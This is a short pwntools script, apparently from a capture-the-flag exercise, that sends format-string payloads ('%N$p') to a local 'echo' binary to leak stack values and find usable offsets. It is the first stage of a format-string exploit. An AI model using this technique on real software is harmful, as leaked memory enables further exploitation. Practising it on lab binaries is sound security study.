from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('echo')

# Let's fuzz x values
for i in range(100):
    try:
        p = process(level='error')
        p.sendlineafter(b'Enter some text: \n','%{}$p'.format(i).encode())
        result = p.recv()

        if result:
            print(f"{i} : {result.decode().split("\n")[0]}")
    except EOFError:
        pass
